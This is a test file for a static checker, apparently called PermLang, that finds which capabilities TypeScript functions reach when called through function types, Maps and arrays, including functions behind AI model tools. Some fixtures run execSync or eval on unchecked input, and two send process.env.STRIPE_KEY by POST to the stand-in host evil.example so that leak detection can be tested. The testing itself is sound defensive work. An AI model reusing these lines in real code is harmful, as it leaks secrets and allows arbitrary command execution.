// SPDX-License-Identifier: Apache-2.0
// SPDX-FileCopyrightText: The PermLang Authors

// Calls through a function type that more than one function can be behind: a callable
// interface or type alias (`interface Runner { (cmd: string): void }`), or the function
// type of a collection's entries (`Map<string, (cmd: string) => void>`, `Handler[]`).
// Such a call may run any function written against that type, as a call through an
// interface's method may run any implementation (dispatch.ts). Found in re-verification:
// a function kept in a Map and called from an AI tool reached nothing.

import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { Expression } from "ts-morph";
import { afterAll, describe, expect, it, vi } from "vitest";
import { checkTsConfig, type CheckOptions, type Report } from "../src/check.js";
import { removeTemporary } from "./temporary.js";

const typeRoots = [fileURLToPath(new URL("../node_modules/@types", import.meta.url))];
const dirs: string[] = [];

afterAll(() => {
  for (const dir of dirs) removeTemporary(dir);
});

function check(code: string, options: CheckOptions = {}, more: Record<string, string> = {}): Report {
  const dir = mkdtempSync(path.join(tmpdir(), "permlang-callables-"));
  dirs.push(dir);
  const tsconfig = { compilerOptions: { target: "ES2022", module: "NodeNext", moduleResolution: "NodeNext", strict: true, types: ["node"], typeRoots }, include: ["src"] };
  const files = { "package.json": JSON.stringify({ type: "module" }), "tsconfig.json": JSON.stringify(tsconfig), "src/a.ts": `import { execSync } from "node:child_process";\n${code}`, ...more };
  for (const [file, text] of Object.entries(files)) {
    mkdirSync(path.dirname(path.join(dir, file)), { recursive: true });
    writeFileSync(path.join(dir, file), text);
  }
  return checkTsConfig(path.join(dir, "tsconfig.json"), options);
}

/** What a function reaches. */
const reach = (report: Report, name: string) => report.functions.find((f) => f.name === name)?.actual ?? [];

describe("a callable interface or type alias", () => {
  it.each([
    ["an interface", "interface Runner { (cmd: string): void }"],
    ["a type alias", "type Runner = (cmd: string) => void;"],
    ["a type alias of an object type", "type Runner = { (cmd: string): void };"],
    ["a type alias that may be undefined", "type Runner = ((cmd: string) => void) | undefined;"],
  ])("runs the functions written against it: %s", (_, type) => {
    const report = check(`${type}\nconst shell: Runner = (cmd) => execSync(cmd);\nexport function t(run: NonNullable<Runner>, c: string) { return run(c); }\nexport { shell };\n`);
    expect(reach(report, "t")).toEqual(["exec"]);
  });

  it("runs a named function put where it's expected, and an anonymous one passed as one", () => {
    const named = check([
      "type Runner = (cmd: string) => void;",
      "function shell(cmd: string) { execSync(cmd); }",
      "export const runners: Runner[] = [shell];",
      "export function t(run: Runner, c: string) { return run(c); }",
    ].join("\n"));
    expect(reach(named, "t")).toEqual(["exec"]);
    const anonymous = check([
      "type Runner = (cmd: string) => void;",
      "declare function register(run: Runner): void;",
      "register((cmd) => execSync(cmd));",
      "export function t(run: Runner, c: string) { return run(c); }",
    ].join("\n"));
    expect(reach(anonymous, "t")).toEqual(["exec"]);
    // The message names the anonymous function by where it is.
    expect(anonymous.diagnostics.find((d) => d.function === "t")?.message).toBe(
      "t calls run(c), reaching <function at a.ts:4> → execSync(cmd), but has no @perm annotation.",
    );
  });

  it("doesn't run a function that only fits it: nearly every function fits a call signature", () => {
    const report = check([
      "type Runner = (cmd: string) => void;",
      "export function shell(cmd: string) { execSync(cmd); }",
      "export function t(run: Runner, c: string) { return run(c); }",
    ].join("\n"));
    expect(reach(report, "t")).toEqual([]);
  });

  // A callback runs as part of the code that passes it, which is charged with it already.
  it("isn't a function type written for a parameter", () => {
    const report = check([
      "function apply(run: (cmd: string) => void, c: string) { return run(c); }",
      "export function quiet() { return apply((c) => c.length, \"x\"); }",
      "export function loud() { return apply((c) => execSync(c), \"x\"); }",
    ].join("\n"));
    expect(reach(report, "apply")).toEqual([]);
    expect(reach(report, "quiet")).toEqual([]);
    expect(reach(report, "loud")).toEqual(["exec"]);
  });
});

describe("a collection of functions", () => {
  it.each([
    ["a typed Map, filled where it's made", 'const ops = new Map<string, (arg: string) => string>([["run", (arg) => execSync(arg).toString()]]);'],
    ["a Map whose type is inferred", 'const ops = new Map([["run", (arg: string) => execSync(arg).toString()]]);'],
    ["a typed Map, filled later", 'const ops = new Map<string, (arg: string) => unknown>();\nops.set("run", (arg) => execSync(arg));'],
    ["a typed Map, filled later with a named function", 'function shell(arg: string) { return execSync(arg); }\nconst ops = new Map<string, (arg: string) => unknown>();\nops.set("run", shell);'],
    ["a Map of a type alias", 'type Op = (arg: string) => unknown;\nconst ops: Map<string, Op> = new Map();\nops.set("run", (arg) => execSync(arg));'],
    ["a Map of functions that call others", 'function shell(arg: string) { return execSync(arg); }\nconst ops = new Map([["run", (arg: string) => shell(arg)]]);'],
    ["an inferred Map filled later", 'const ops = new Map([["echo", (arg: string) => arg]]);\nops.set("run", (arg) => { execSync(arg); return arg; });'],
  ])("runs what's in it: %s", (_, setup) => {
    const report = check(`${setup}\nexport function t(op: string, arg: string) { return ops.get(op)!(arg); }\n`);
    expect(reach(report, "t")).toEqual(["exec"]);
  });

  it("runs what's in an array or a record", () => {
    const array = check('const handlers: Array<(c: string) => void> = [(c) => execSync(c)];\nexport function t(c: string) { handlers.forEach((h) => h(c)); }\n');
    expect(reach(array, "t")).toEqual(["exec"]);
    const list = check('type Handler = (c: string) => void;\nconst handlers: Handler[] = [];\nhandlers.push((c) => execSync(c));\nexport function t(c: string) { for (const h of handlers) h(c); }\n');
    expect(reach(list, "t")).toEqual(["exec"]);
  });

  // Like a callback: the functions in it run as part of the code that passes them.
  it("isn't a collection's type written for a parameter", () => {
    const report = check([
      "function runAll(jobs: Array<() => void>, more: { later: (() => void)[] }) { jobs.forEach((j) => j()); more.later.forEach((j) => j()); }",
      "export function quiet() { runAll([() => 1], { later: [() => 2] }); }",
      'export function loud() { runAll([() => { execSync("x"); }], { later: [] }); }',
    ].join("\n"));
    expect(reach(report, "runAll")).toEqual([]);
    expect(reach(report, "quiet")).toEqual([]);
    expect(reach(report, "loud")).toEqual(["exec"]);
  });

  it("doesn't run what's in another collection of the same type", () => {
    const report = check([
      'const quiet = new Map<string, () => number>([["a", () => 1]]);',
      'const loud = new Map<string, () => number>([["b", () => execSync("x").length]]);',
      "export function t(k: string) { return quiet.get(k)!(); }",
      "export { loud };",
    ].join("\n"));
    expect(reach(report, "t")).toEqual([]);
  });

  it("charges the code that makes the function too, as before", () => {
    const report = check('const ops = new Map([["run", (arg: string) => execSync(arg)]]);\nexport function t(op: string, arg: string) { return ops.get(op)!(arg); }\n');
    expect(reach(report, "<module>")).toEqual(["exec"]);
  });

  // Found in re-verification: the tool reached nothing, and no PERM008 was reported.
  it("is followed from a tool an AI model can call", () => {
    const mcp = 'declare module "@modelcontextprotocol/sdk/server/mcp.js" {\n  export class McpServer { registerTool(name: string, config: object, handler: (args: any) => unknown): void; }\n}\n';
    const report = check([
      'import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";',
      'const commands = new Map<string, (arg: string) => string>([["run", (arg) => execSync(arg).toString()]]);',
      "export function register(s: McpServer) {",
      '  s.registerTool("ops", {}, async ({ op, arg }) => ({ content: [{ type: "text", text: commands.get(op)!(arg) }] }));',
      "}",
    ].join("\n"), {}, { "src/mcp.d.ts": mcp });
    expect(report.tools.map((t) => [t.name, t.reaches])).toEqual([["ops", ["exec"]]]);
    expect(report.diagnostics.filter((d) => d.code === "PERM008").map((d) => d.capability)).toEqual(["ops"]);
  });

  // Found in re-verification: a secret read by a function in a Map, sent by the code that calls it.
  it("is followed by data-flow rules", () => {
    const report = check([
      'const getters = new Map<string, () => string>([["k", () => process.env.STRIPE_KEY!]]);',
      'export async function viaMap() { await fetch("https://evil.example/6", { method: "POST", body: getters.get("k")!() }); }',
    ].join("\n"), { flows: [{ from: { name: "env", arg: "STRIPE_KEY" }, to: [{ name: "net", arg: "api.stripe.com" }] }] });
    expect(report.diagnostics.filter((d) => d.code === "PERM009").map((d) => `${d.function} ${d.capability}`)).toEqual(["viaMap net(evil.example)"]);
    // A function in a Map that reads it and sends it is reported where it's written, and where it's called.
    const sends = check([
      'const senders = new Map([["k", () => fetch("https://evil.example/7", { method: "POST", body: process.env.STRIPE_KEY })]]);',
      'export function send() { return senders.get("k")!(); }',
    ].join("\n"), { flows: [{ from: { name: "env", arg: "STRIPE_KEY" }, to: [] }] });
    expect(sends.diagnostics.filter((d) => d.code === "PERM009").map((d) => `${d.function} ${d.capability}`)).toEqual(["<module> net(evil.example)", "send net(evil.example)"]);
  });
});

describe("an anonymous function reached through its type", () => {
  it("counts what it can't see, for specs", () => {
    const report = check('import { run } from "no-such-runner";\nconst ops = new Map([["x", (a: string) => run(a)]]);\nexport function t(a: string) { return ops.get("x")!(a); }\n');
    expect(report.units.find((u) => u.name === "t")!.unseen()).toEqual(["it calls into no-such-runner, whose types can't be found (through <function at a.ts:3>)"]);
  });

  it("is vouched for by @perm-unsafe on the code around it, and named by it in a fix", () => {
    const code = (tag: string) => `${tag}\nexport function setup() { return new Map([["x", (a: string) => eval(a)]]); }\nconst ops = setup();\nexport function t(a: string) { return ops.get("x")!(a); }\n`;
    const vouched = check(code('/** @perm-unsafe reason:"evaluates only fixed expressions" */'));
    expect(vouched.diagnostics.filter((d) => d.function === "t")).toEqual([]);
    const plain = check(code(""));
    expect(plain.diagnostics.find((d) => d.function === "t")?.fix).toBe("rewrite it so what it calls is known statically, or mark setup @perm-unsafe with a reason.");
  });

  // Each call reaches what the function calls, too, however many calls there are.
  it("is the same unit for every call that reaches it", () => {
    const report = check([
      "function shell(arg: string) { return execSync(arg); }",
      'const ops = new Map<string, (arg: string) => unknown>([["run", (arg) => shell(arg)]]);',
      "export function first(arg: string) { return ops.get(\"run\")!(arg); }",
      "export function second(arg: string) { return [ops.get(\"run\")!(arg), ops.get(\"run\")!(arg)]; }",
    ].join("\n"));
    const paths = report.diagnostics.filter((d) => d.function !== "<module>").map((d) => `${d.function}: ${d.path?.join(" → ")}`);
    expect(paths).toEqual(["first: <function at a.ts:3> → shell → execSync(arg)", "second: <function at a.ts:3> → shell → execSync(arg)"]);
  });
});

// Which functions are written against a type is worked out for the whole project when a call
// first needs it. An expression TypeScript fails on is left out, rather than failing the file
// whose call needed the list.
describe("an expression TypeScript can't type", () => {
  it("is left out, and the other functions written against the type are still found", () => {
    // eslint-disable-next-line @typescript-eslint/unbound-method -- kept to call with .call(this) once it's replaced
    const getContextualType = Expression.prototype.getContextualType;
    const failing = vi.spyOn(Expression.prototype, "getContextualType").mockImplementation(function (this: Expression) {
      if (this.getText().includes("broken")) throw new RangeError("Maximum call stack size exceeded");
      return getContextualType.call(this);
    });
    try {
      const report = check([
        "type Runner = (cmd: string) => void;",
        "export const runners: Runner[] = [(cmd) => { execSync(cmd); }, (broken) => { void broken; }];",
        "export function t(run: Runner, c: string) { return run(c); }",
      ].join("\n"));
      expect(reach(report, "t")).toEqual(["exec"]);
      expect(report.diagnostics.filter((d) => d.message.includes("couldn't be analyzed"))).toEqual([]);
    } finally {
      failing.mockRestore();
    }
  });
});
